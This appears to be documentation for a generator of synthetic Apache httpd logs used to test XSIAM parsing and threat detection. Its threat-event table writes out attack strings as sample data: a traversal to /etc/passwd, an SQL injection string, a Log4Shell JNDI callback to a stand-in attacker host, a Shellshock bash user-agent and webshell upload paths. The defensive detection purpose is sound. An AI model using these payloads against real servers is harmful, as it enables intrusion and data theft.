# Apache httpd

**Dataset:** `apache_httpd_raw`
**Transport:** Syslog (TCP)
**Format:** Native Apache access log and error log, wrapped in a syslog-style header

Simulates Apache HTTP Server 2.4 access and error logs for the XSIAM `apache_httpd_raw` dataset. The XSIAM built-in **Packs/ApacheWebServer v1.3** modeling rule parses both log types. Each log line is wrapped with a `MMM DD HH:MM:SS hostname httpd[pid]:` syslog header that the v1.3 parser uses for `xdm.observer.name` and `xdm.source.process.pid` extraction.

### Log Format

**Access log** (one line per HTTP request):

```
Mar 26 14:05:12 www.examplecorp.com httpd[4321]: www.examplecorp.com:443 10.0.10.50 <client_ip> - <username> [26/Mar/2025:14:05:12 +0000] "<METHOD> <url> HTTP/1.1" <status> <bytes_sent> "<referer>" "<user_agent>" <pid> <request_time_us> on <ssl_proto> <ssl_cipher> <unique_id> <ephemeral_port> <bytes_received> <bytes_sent_with_headers> "www.examplecorp.com" main - -
```

- `ssl_protocol`: `TLSv1.3` (40%) or `TLSv1.2` (60%)
- `ssl_cipher`: matched to protocol (e.g., `TLS_AES_256_GCM_SHA384` for TLSv1.3, `ECDHE-RSA-AES256-GCM-SHA384` for TLSv1.2)
- `unique_id`: 22-char base62 Apache `mod_unique_id` style identifier
- Parser extraction: `source_ipv4` from client field; `target_port`/`local_ipv4` from `hostname:port localIP`; `process_id` from between closing user-agent quote and next field; `tls_protocol_version` from TLSv... token

**Error log** (infrastructure and application errors):

```
Mar 26 14:05:12 www.examplecorp.com httpd[4321]: [crit] [pid 4321:tid 140712345678] [client 10.0.10.1] [msg "AH00052: child pid 5432 exit signal Segmentation fault (11)"]
```

- `[msg "AH#####: ..."]` wrapper is **intentional** — the v1.3 `message1` regex captures content inside `[msg "..."]` for `xdm.event.description`
- `severity1` is captured from the `[level]` bracket immediately after `httpd[pid]:`
- `pid`/`tid` are extracted by their respective parser regexes for process tracking

### Key XDM Field Mappings

| Access Log Field | XDM Field |
|---|---|
| Client IP | `xdm.source.ipv4` |
| Username (if authenticated) | `xdm.source.user.username` |
| HTTP method | `xdm.network.http.method` |
| URL | `xdm.network.http.url` |
| Status code | `xdm.network.http.response_code` |
| Bytes sent (response body) | `xdm.target.sent_bytes` |
| User-Agent | `xdm.source.user_agent` |
| TLS protocol version | `xdm.network.tls.protocol_version` |
| TLS cipher | `xdm.network.tls.cipher` |
| Server hostname | `xdm.observer.name` |
| Server port | `xdm.target.port` |
| Process ID | `xdm.source.process.pid` |

| Error Log Field | XDM Field |
|---|---|
| Log level (crit/alert/error/warn/info) | `xdm.event.log_level` |
| Client IP | `xdm.source.ipv4` |
| AH error message | `xdm.event.description` |
| Process ID | `xdm.source.process.pid` |

---

## Benign Events

Benign events are dispatched from `_generate_benign_log` by weighted random choice. All benign generators produce access log entries except `routine_error_log`, which produces an error log entry. The `_get_user_agent()` function returns browser user agents for benign events (Mozilla-family strings) and scanner/tool agents for threat events.

| Event Type | Description | Key Fields |
|---|---|---|
| `health_check` | Load balancer or uptime monitor polling a health endpoint. Source IP is derived from the server subnet (conventionally `.1`). These events dominate real server logs. **Hunt exclusion:** `source_ip` in internal CIDRs OR `user_agent` in (`ELB-HealthChecker/2.0`, `GoogleHC/1.0`, `HAProxy/2.8`, `curl/7.88.1`, `kube-probe/1.29`). | `method=GET`, `url=/health|/ping|/healthz|/status|/api/health|/api/v1/health`, `status=200`, `bytes_sent=28–80`, `source_ip=server_subnet.1`, health check user agent |
| `options_preflight` | HTTP OPTIONS CORS preflight from a browser single-page application. Every cross-origin API call from a modern SPA is preceded by an OPTIONS request. **Hunt exclusion:** `method=OPTIONS AND url starts_with /api/`. | `method=OPTIONS`, `url=/api/v1/userinfo|/api/v2/data|/api/auth|...`, `status=204 or 200`, `bytes_sent=0`, browser user agent |
| `head_request` | HEAD request from a CDN, monitoring agent, or link checker. Response body is omitted — `bytes_sent` is always 0. **Hunt note:** `HEAD` with `bytes_sent > 0` would be a parser anomaly. | `method=HEAD`, `url=benign_url from config`, `status=200`, `bytes_sent=0`, browser user agent |
| `crawler_request` | Search engine or social media crawler. Uses realistic bot user agents paired with their known IP prefixes (Googlebot: 66.249.x.x, bingbot: 157.55.x.x, YandexBot: 77.88.x.x). **Hunt exclusion:** `user_agent contains "Googlebot" OR "bingbot" OR "YandexBot"`. | `method=GET`, `url=/robots.txt|/sitemap.xml|/sitemap_index.xml|/|/about.html`, `status=200`, `bytes_sent=128–5000`, bot user agent |
| `routine_error_log` | Infrastructure event: Apache startup, shutdown, missing file, or misconfigured path. Uses verified Apache AH error codes. | `level=notice/info/warn/error`, error codes: `AH00292` (configured), `AH00025` (SIGTERM), `AH00163` (build info), `AH00112` (missing DocumentRoot), `AH00128` (missing file), `AH00132` (permissions deny) |

---

## Threat Events

All threat events are generated by `_generate_attack_burst`, which returns a **list** of log lines (15–25 events per burst). The `forced_type` parameter enables dispatch of a specific attack type by name; otherwise `random.choice(_ATTACK_TYPES)` is used. Each burst uses a single attacker IP (except `credential_stuffing`, which rotates IPs).

| Attack Type | Description | Key Detection Signal | Key Fields |
|---|---|---|---|
| `recon_scan` | GET requests to common admin/sensitive paths. Same attacker IP, all returning 404. | Count 404s from single IP over time window | `method=GET`, `status=404`, `url` from `config.apache_config.recon_urls` (e.g., `/admin.php`, `/.git/config`), tool user agent |
| `directory_traversal` | GET requests with path traversal sequences or sensitive file paths. All blocked with 403. | Count 403s from single IP; `url` contains `../` or `%2F..` | `method=GET`, `status=403`, `url` one of: `/cgi-bin/..%2F..%2F..%2Fetc%2Fpasswd`, `/.env`, `/backup.sql.gz`, `/conf/web.config.bak`, bytes_sent=209 |
| `auth_bruteforce` | High-volume authentication attempts from a **single IP** to the same protected endpoint. Response is consistently 401 Unauthorized. Distinct from `credential_stuffing` (which uses many IPs). | Count 401s from single IP to same URL | `method=GET`, `status=401`, `url` from `_BASIC_AUTH_URLS` (e.g., `/admin/`, `/phpmyadmin/`), `username` set in log, single `source_ip` |
| `server_error_burst` | Malformed or abusive POST requests generating repeated 5xx responses. May indicate exploitation of a backend processing endpoint. | Count 5xx from same URL; POST to unusual endpoints | `method=POST`, `status=500/502/503`, `url=/api/v1/process|/api/v2/execute|/cgi-bin/handler.pl`, bytes_sent=521 |
| `critical_error` | Severe Apache infrastructure error — child process crash (segfault) or socket bind failure. Generates **error log** entries, not access log. | Filter `xdm.event.log_level` in (`CRITICAL`, `ALERT`) | `level=crit or alert`, `AH00052: child pid NNN exit signal Segmentation fault (11)` or `AH00072: make_sock: could not bind to address 0.0.0.0:443` |
| `malicious_payload` | GET requests embedding SQL injection, XSS, or command injection payloads in query string parameters. All percent-encoded. | `url` contains `%27`, `%3Cscript`, `%7C` (pipe), `%60id%60` patterns | `method=GET`, `status=403/400/404`, `url=/search.php?id=%27+OR+1%3D1--` or XSS/cmd variants, bytes_sent=412 |
| `webshell_execution` | Two-phase attack: (1) POST malicious PHP file to an upload handler; (2) POST OS commands to the uploaded shell path. Signal is POST to `*.php` in `/uploads/` with a small response body. | POST to `*.php` in `/uploads/` with `bytes_sent < 500` AND `status=200` | Phase 1: `method=POST`, `url=/upload.php` or `/wp-content/plugins/.../connector.minimal.php`, `bytes_sent=150–400`; Phase 2: `method=POST`, `url=/uploads/shell.php`, `bytes_sent=20–450`, referer set to upload endpoint |
| `log4shell_probe` | CVE-2021-44228 JNDI injection in the `User-Agent` header against normal-looking endpoints. HTTP response is 200 (server processes request normally while Log4j asynchronously makes LDAP/DNS callback). Includes obfuscated variants (`${lower:l}...`). | `user_agent contains "${jndi:"` (case-insensitive for obfuscated forms) | `method=GET`, `status=200/404/400`, normal URL, `user_agent=${jndi:ldap://attacker_ip:1389/...}` or obfuscated variant, bytes_sent=1000–15000 |
| `shellshock_probe` | CVE-2014-6271 bash function definition in `User-Agent`, targeting CGI endpoints. A vulnerable bash executes the trailing command when processing `HTTP_USER_AGENT`. Response 500 (crash, 50%), 200 (successful exploitation, 30%), 404 (20%). | `user_agent contains "() {" AND url contains "/cgi-bin/"` | `method=GET`, `url=/cgi-bin/bash|/cgi-bin/test.cgi|/cgi-bin/status|...`, `user_agent=() { :; }; /bin/bash -c '...'`, `status=500/200/404`, bytes_sent=0–500 |
| `method_probing` | Enumeration of allowed HTTP methods as a reconnaissance step. Methods: `TRACE` (XST attack), `CONNECT` (SSRF chain), `PROPFIND` (WebDAV enumeration), `TRACK`, `DEBUG`. A hardened server returns 405; a misconfigured one may return 200 for TRACE. | `method in (TRACE, CONNECT, PROPFIND, TRACK, DEBUG)` — almost never legitimate | Picks from `_PROBE_METHODS` tuples (method, url, status); `status=405` (hardened) or `200` (TRACE on misconfigured server), bytes_sent=0–300 |
| `credential_stuffing` | **Distributed** POST authentication attempts using a **different external IP per attempt** (botnet pattern). Stays under per-IP rate limits. Distinct from `auth_bruteforce` (single IP, high volume). | `count_distinct(source_ip)` on `status=401` to same login URL over time window | `method=POST`, `url=/api/auth`, `status=401`, `username` in log, **each event uses a different source IP** (`_random_external_ip()` called per iteration), bytes_sent=280 |
| `data_exfiltration` | Authenticated session downloading large amounts of data. Same source IP and username, repeated requests to bulk-export endpoints. Individual requests may look plausible; total volume over the window is the anomaly. | `sum(bytes_sent) by source_ip, username over 1h | filter sum > 50MB` | `method=GET`, `status=200`, `url=/api/v1/export|/api/v2/users/export|/admin/reports/download|...`, `bytes_sent=500000–5000000` per request, `username` set, same `source_ip` throughout burst |
